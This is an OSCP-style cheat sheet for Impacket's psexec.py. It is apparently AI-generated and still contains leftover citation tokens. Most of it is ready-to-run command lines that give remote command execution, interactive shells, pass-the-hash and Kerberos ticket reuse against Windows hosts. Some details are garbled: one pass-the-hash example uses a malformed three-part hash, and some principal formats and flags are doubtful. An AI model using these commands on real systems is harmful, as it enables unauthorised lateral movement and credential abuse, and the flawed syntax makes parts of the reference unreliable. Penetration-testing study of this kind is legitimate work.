# impacket-psexec — quick wiki (OSCP notes)

Short, practical reference focused on examples and common workflows for `psexec.py` (Impacket).

> Note: Impacket's PsExec implementation creates a temporary service on the target to execute commands (similar to Sysinternals PsExec). Use responsibly in labs only. See Impacket's examples for full options. citeturn0search2turn0search11

---

## One-line cheat
Remote command execution and interactive shell on Windows via SMB (creates a temporary service).

---

## Quick flags & positional usage
- **Positional target format**: `[[domain/]username[:password]@]<target>`  
- `-hashes LM:NT` — pass-the-hash (NTLM hash).  
- `-no-pass` — do not prompt for a password (useful with Kerberos ticket or -k).  
- `-k` — use Kerberos authentication (requires valid TGT / KRB5CCNAME).  
- `-aesKey <key>` — use an AES key for Kerberos authentication.  
- `-dc-ip <IP>` — specify domain controller IP for Kerberos / NetBIOS resolution.  
- `-port <port>` — alternate SMB port.  
- `-time` / `-debug` — verbose/debugging options (script-specific).  
- `-serviceName` / `-service`: some variants support service overrides (check your Impacket version).  
(Refer to the script header for exact flags on your installed version). citeturn0search2

---

## Common workflows & examples

### 1) Basic: run `whoami` with username & password
```bash
# domain\user with password embedded (lab use only)
python3 /path/to/psexec.py TESTDOMAIN/john:Passw0rd@10.10.10.5 whoami

# or without domain (local account)
python3 psexec.py alice:Password@10.10.10.5 whoami
```
This executes `whoami` on the target and prints output. citeturn0search2

### 2) Interactive shell (default `cmd.exe`)
```bash
# launch an interactive cmd.exe on the remote host
python3 psexec.py TESTDOMAIN/john:Passw0rd@10.10.10.5
```

### 3) Pass-the-hash (NTLM) — no password, use -hashes
```bash
# provide LM:NT; LM can be empty if not available (":<nthash>")
python3 psexec.py TESTDOMAIN/john@10.10.10.5 -hashes :aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef whoami
```
Impacket supports NTLM relay-style/hash auth via the `-hashes` option. citeturn0search2

### 4) Kerberos-based execution (use an existing TGT)
```bash
# export a valid Kerberos ticket and use -k -no-pass
export KRB5CCNAME=/path/to/ccache
python3 psexec.py TESTDOMAIN/john@10.10.10.5 -k -no-pass whoami
```
Useful for overpass-the-hash / pass-the-ticket workflows. citeturn0search13turn0search2

### 5) Using domain and username formats (DOMAIN\\user, user@DOMAIN)
```bash
# domain-prefixed username in target string (recommended)
python3 psexec.py DOMAIN/jane:Secret@10.10.10.5 ipconfig /all

# NT-style principal (sometimes accepted)
python3 psexec.py jane@DOMAIN:Secret@10.10.10.5 systeminfo

# alternative: supply username and -W (workgroup/domain)
python3 psexec.py jane:Secret@10.10.10.5 -W DOMAIN whoami
```
Different networks and Impacket versions may accept slightly different principal formats. citeturn0search6turn0search2

### 6) Specify DC IP (helpful for Kerberos / name resolution)
```bash
python3 psexec.py DOMAIN/john:Pass@10.10.10.5 -dc-ip 10.10.10.2 whoami
```

### 7) Run a command and exit (non-interactive)
```bash
python3 psexec.py DOMAIN/john:Pass@10.10.10.5 "ipconfig /all"
```

### 8) Use NTLM hash with explicit target and port
```bash
python3 psexec.py DOMAIN/john@10.10.10.5 -hashes :<nthash> -port 445 whoami
```

---

## Tips & gotchas
- Impacket's `psexec.py` creates a temporary Windows service (random name); check Event ID 7045 and IPC$ artifacts for detection. citeturn0search11turn0search4  
- Use `-no-pass` with `-k` when relying on a Kerberos ticket (avoid password prompting). citeturn0search13  
- Pass-the-hash syntax expects `LM:NT` — LM can be empty (`:NThash`). Keep hashes secret. citeturn0search2  
- If you get authentication errors, try `-dc-ip` to point to the domain controller for Kerberos. citeturn0search6  
- Impacket scripts evolve; check `psexec.py -h` or the script header for the exact options on your installed version. citeturn0search2

---

## Minimal reference (copyable)
```text
# interactive shell
python3 psexec.py DOMAIN/john:Passw0rd@10.10.10.5

# run single command
python3 psexec.py DOMAIN/john:Passw0rd@10.10.10.5 whoami

# pass-the-hash (NTLM)
python3 psexec.py DOMAIN/john@10.10.10.5 -hashes :<nthash> whoami

# kerberos ticket (no password)
export KRB5CCNAME=/tmp/ccache
python3 psexec.py DOMAIN/john@10.10.10.5 -k -no-pass whoami
```

---

Filename suggestion: `impacket_psexec_oscp.md`
References: Impacket `psexec.py` example and analysis. citeturn0search2turn0search11
